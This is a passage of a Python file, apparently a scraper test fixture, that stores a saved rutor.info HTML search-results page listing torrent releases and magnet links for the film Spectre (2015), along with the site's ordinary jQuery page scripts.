# coding: utf-8
__author__ = 'mancuniancol'

html = '''

<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
	<title>rutor.info :: Поиск</title>
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>

</head>
<body>

<div id="all">

<div id="up">

<div id="logo">
	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
</div>

<table id="news_table">
  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
  <script type="text/javascript">
  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
  </script>

</div>

<div id="menu">
<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
<a href="/top" class="menu_b"><div>Топ</div></a>
<a href="/categories" class="menu_b"><div>Категории</div></a>
<a href="/browse/" class="menu_b"><div>Всё</div></a>
<a href="/search/" class="menu_b"><div>Поиск</div></a>
<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
<a href="/upload.php" class="menu_b"><div>Залить</div></a>
<a href="/jabber.php" class="menu_b"><div>Чат</div></a>

<div id="menu_right_side"></div>

<script type="text/javascript">
$(document).ready(function()
{
	var menu_right;
	if ($.cookie('userid') > 0)
	{
		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
	}
	else
	{
		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
	}
	$("#menu_right_side").html(menu_right);
});
</script>

</div>
<h1>Поиск</h1>
</div>
<div id="ws">
<div id="content">

<center>
<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
</center>



<div id="msg1"></div>
<script type="text/javascript">
$(document).ready(function()
{
	if ($.cookie('msg') != null)
	{
		if ($.cookie('msg').length > 0)
		{
			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
			$("#msg1").html(msg2);
			$.cookie('msg', '', { expires: -1 });
		}
	}
});
</script><script type="text/javascript">
	var search_page = 0;
	var search_string = 'spectre 2015';
	var search_category = 0;
	var search_sort = 0;
	var search_in = 0;
	var search_method = 0;
	var sort_ascdesc = 0;

	if (search_sort % 2 != 0)
	{
		search_sort -= 1;
		sort_ascdesc = 1;
	}


	$(document).ready(function()
	{
		$('#category_id').attr("value", search_category);
		$('#sort_id').attr("value", search_sort);
		//$('#inputtext_id').val(search_string);
		$('#search_in').attr("value", search_in);
		$('#search_method').attr("value", search_method);
		if (sort_ascdesc == 0)
			$('input[name=s_ad]')[1].checked = true;
		else
			$('input[name=s_ad]')[0].checked = true;
	});

	function search_submit()
	{
		var sort_id = parseInt($('#sort_id').val())+parseInt($('input[name=s_ad]:checked').val());
		document.location.href = '/search/' + search_page + '/' + $('#category_id').val() + '/' + $('#search_method').val()+''+$('#search_in').val()+'0' + '/' + sort_id + '/' + $('#inputtext_id').val().replace(/&/g,'AND');
	}
	</script><fieldset><legend>Поиск и сортировка</legend>
	<form onsubmit="search_submit(); return false;">
	<table>
	<tr>
	<td>Ищем</td>
	<td>
		<input type="text" size="35" id="inputtext_id" value="spectre 2015" />
		<select name="search_method" id="search_method">
			<option value="0">фразу полностью</option>
			<option value="1">все слова</option>
			<option value="2">любое из слов</option>
			<option value="3">логическое выражение</option>
		</select>
		в
		<select name="search_in" id="search_in">
			<option value="0">названии</option>
			<option value="1">названии и описании</option>
		</select>
	</td>
	</tr>
	<tr>
	<td>Категория</td>
	<td>
	<select name="category" id="category_id">
		<option value="0">Любая категория</option><option value="1">Зарубежные фильмы</option><option value="5">Наши фильмы</option><option value="12">Научно-популярные фильмы</option><option value="4">Сериалы </option><option value="6">Телевизор</option><option value="7">Мультипликация </option><option value="10">Аниме </option><option value="2">Музыка</option><option value="8">Игры </option><option value="9">Софт </option><option value="13">Спорт и Здоровье</option><option value="15">Юмор</option><option value="14">Хозяйство и Быт</option><option value="11">Книги </option><option value="3">Другое</option></select>
	</td>
	</tr>
	<tr>
	<td>Упорядочить по</td>
	<td>
	<select id="sort_id">
		<option value="0">дате добавления</option>
		<option value="2">раздающим</option>
		<option value="4">качающим</option>
		<option value="6">названию</option>
		<option value="8">размеру</option>
		<option value="10">релевантности</option>
	</select>
	по
	<label><input type="radio" name="s_ad" value="1"  />возрастанию</label>
	<label><input type="radio" name="s_ad" value="0"  checked="checked"  />убыванию</label>
	</td>
	</tr>

	<tr>
	<td>
	<input type="submit" value="Поехали" onclick="search_submit(); return false;" />
	</td>
	</tr>


	</table>
	</form>
	</fieldset><div id="index"><b>Страницы:  1</b> Результатов поиска 30 (max. 2000)<table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>26&nbsp;Мар&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/495223"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5f77c454fb6c779fcfea30b38928238cbeba00db&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/495223/007-spektr_spectre-2015-hdrip-avc-d">007: СПЕКТР / Spectre (2015) HDRip-AVC | D </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">749.55&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;39</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>05&nbsp;Мар&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/491349"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:fd4201b6f95098f0f383744f240e5bd3b5a6b400&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/491349/007-spektr_spectre-2015-bdrip-avc-ot-mediaclub-d-a">007: СПЕКТР / Spectre (2015) BDRip-AVC от MediaClub | D, A </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">4.43&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;49</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>04&nbsp;Мар&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/491148"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:bb103e67b6fff062b3431194118375b3b814e896&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/491148/007-spektr_spectre-2015-bdrip-ot-exkinoray-a">007: СПЕКТР / Spectre (2015) BDRip от ExKinoRay | A </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">2.19&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;29</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>03&nbsp;Мар&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/491044"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:06a715011668a0c274ea8ad929d264a3d244793c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/491044/007-spektr_spectre-2015-bdrip-720p-ot-nnnb-60-fps-d-licenzija">007: СПЕКТР / Spectre (2015) BDRip 720p от NNNB | 60 fps | D | Лицензия </a></td> <td align="right">6<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">6.90&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;34</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>24&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/489392"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b8812e64c7b22d3b39da80582e6e2538b350e5b4&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/489392/007-spektr_spectre-2015-bdrip-720p-ot-exkinoray-d-a-licenzija">007: СПЕКТР / Spectre (2015) BDRip 720p от ExKinoRay | D, A | Лицензия </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">11.36&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;35</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>24&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/489387"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e8a13066def7622fc87b3fc6d36d8ce32c1142fe&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/489387/007-spektr_spectre-2015-bdrip-1080p-ot-exkinoray-d-a-licenzija">007: СПЕКТР / Spectre (2015) BDRip 1080p от ExKinoRay | D, A | Лицензия </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">19.13&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;48</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>24&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/489373"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c006cf72efa76801b25dc94db663abc8e9d0ae0e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/489373/007-spektr_spectre-2015-bdremux-1080p-ot-exkinoray-d-a-licenzija">007: СПЕКТР / Spectre (2015) BDRemux 1080p от ExKinoRay | D, A | Лицензия </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">42.31&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;11</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>21&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/488783"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:325606f197d93d73905dc87e54aa04932d060bbe&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/488783/007-spektr_spectre-2015-bdrip-avc-ot-r.g-hd-films-60-fps-licenzija">007: СПЕКТР / Spectre (2015) BDRip-AVC от R.G. HD-Films | 60 fps | Лицензия </a></td> <td align="right">9<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">3.94&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;47</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>19&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/488415"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5f169b8bd7dffd7ed4ced9ac2c89ae0564a77e9f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/488415/007-spektr_spectre-2015-dvd5-d">007: СПЕКТР / Spectre (2015) DVD5 | D </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">4.37&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;15</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>17&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/488071"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f288be8d2d55f37b7b785f9c248fcd6b40677893&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/488071/007-spektr_spectre-2015-bdrip-ot-hqclub-licenzija">007: СПЕКТР / Spectre (2015) BDRip от HQCLUB | Лицензия </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">2.91&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;111</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>15&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/487679"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:824e7de13cc30dcc782138824ce3d52870275a7c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/487679/007-spektr_spectre-2015-bdrip-720p-licenzija">007: СПЕКТР / Spectre (2015) BDRip 720p | Лицензия </a></td> <td align="right">11<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">7.76&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;76</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;5</span></td></tr><tr class="tum"><td>14&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/487381"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4c00c3a75fbcbdba49e3cdcb953bccf7c722bddd&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/487381/007-spektr_spectre-2015-dvd9-ot-new-team-licenzija">007: СПЕКТР / Spectre (2015) DVD9 от New-Team | Лицензия </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">7.56&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;10</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>14&nbsp;Фев&nbsp;16</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/487292"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b2dce68bb34b22d3023de9d9dea072b1b77ef2bf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/487292/007-spektr_spectre-2015-bdrip-720p-dopolnitelnye-materialy">007: СПЕКТР / Spectre (2015) BDRip 720p | Дополнительные материалы </a></td>
<td align="right">920.41&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>13&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/487264"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:060a0336f258d93a148f1c42eaa941f280be8f7e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/487264/007-spektr_spectre-2015-hdrip-ot-scarabey-licenzija">007: СПЕКТР / Spectre (2015) HDRip от Scarabey | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">1.45&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;184</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>13&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/482443"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1efed9ad98358416a47969ec77004c3aadc7dbfc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/482443/007-spektr_spectre-2015-hdrip-ot-scarabey-licenzija">007: СПЕКТР / Spectre (2015) HDRip от Scarabey | Лицензия </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;51</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>13&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/482774"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2948607b0e6355d8d5a09e08a78e4ca3be44398d&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/482774/007-spektr_spectre-2015-hdrip-ot-scarabey-licenzija">007: СПЕКТР / Spectre (2015) HDRip от Scarabey | Лицензия </a></td> <td align="right">10<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">802.41&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;25</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>13&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/487135"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e8ac9c828f1a230d52ffe04f4d1958a021b6f1ef&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/487135/007-spektr_spectre-2015-bdrip-ot-exkinoray-d-a-licenzija">007: СПЕКТР / Spectre (2015) BDRip от ExKinoRay | D, A | Лицензия </a></td> <td align="right">3<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">3.12&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;26</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="tum"><td>13&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/487118"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4a249cf550d78a781649b85f59d499bcba8f7add&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/487118/007-spektr_spectre-2015-bdrip-avc-ot-exkinoray-d-a-licenzija">007: СПЕКТР / Spectre (2015) BDRip-AVC от ExKinoRay | D, A | Лицензия </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">4.84&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;23</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>13&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/483363"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1b5931a81dcb6af4b28ddfe412edb9efdde80b6a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/483363/007-spektr_spectre-2015-bdrip-720p-ot-scarabey-licenzija">007: СПЕКТР / Spectre (2015) BDRip 720p от Scarabey | Лицензия </a></td> <td align="right">19<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">9.58&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;27</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>12&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/487085"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:446ea6f36d44a24abddf6180a0d64f00e156d4dc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/487085/007-spektr_spectre-2015-bdrip-1080p">007: СПЕКТР / Spectre (2015) BDRip 1080p </a></td> <td align="right">56<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">11.67&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;329</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;15</span></td></tr><tr class="gai"><td>12&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/486959"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:9a435715bca773c36b93d16a497aa13d94c6f087&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/486959/007-spektr_spectre-2015-bdrip-avc-ot-hellywood-licenzija">007: СПЕКТР / Spectre (2015) BDRip-AVC от HELLYWOOD | Лицензия </a></td> <td align="right">6<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">2.91&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;437</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;15</span></td></tr><tr class="tum"><td>12&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/486957"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:aff363a8740aca508bbdd458251a0c7c181a8eeb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/486957/007-spektr_spectre-2015-bdrip-avc-ot-hellywood-licenzija">007: СПЕКТР / Spectre (2015) BDRip-AVC от HELLYWOOD | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;178</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;7</span></td></tr><tr class="gai"><td>12&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/486954"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:db29003ce01081cdf28f01f5b6c99bf0ee1c4cd6&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/486954/007-spektr_spectre-2015-blu-ray-1080p-d-licenzija">007: СПЕКТР / Spectre (2015) Blu-ray 1080p | D | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">41.90&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;13</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>12&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/482261"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:9ce7d3651f183e058dbe6ddbd923b9641c432680&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/482261/007-spektr_spectre-2015-bdrip-ot-twi7ter-licenzija">007: СПЕКТР / Spectre (2015) BDRip от Twi7ter | Лицензия </a></td> <td align="right">59<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;957</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;26</span></td></tr><tr class="gai"><td>12&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/486944"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:80d2b1476c1e864f3019c51bbe32868d6984600f&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/486944/007-spektr_spectre-2015-bdrip-720p-d-a-licenzija">007: СПЕКТР / Spectre (2015) BDRip 720p | D, A | Лицензия </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">12.73&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;46</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>12&nbsp;Фев&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/486943"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cda254fd6b5aff94059e4359ebc6ea4befe72d57&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/486943/007-spektr_spectre-2015-bdrip-1080p-d-a-licenzija">007: СПЕКТР / Spectre (2015) BDRip 1080p | D, A | Лицензия </a></td> <td align="right">9<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
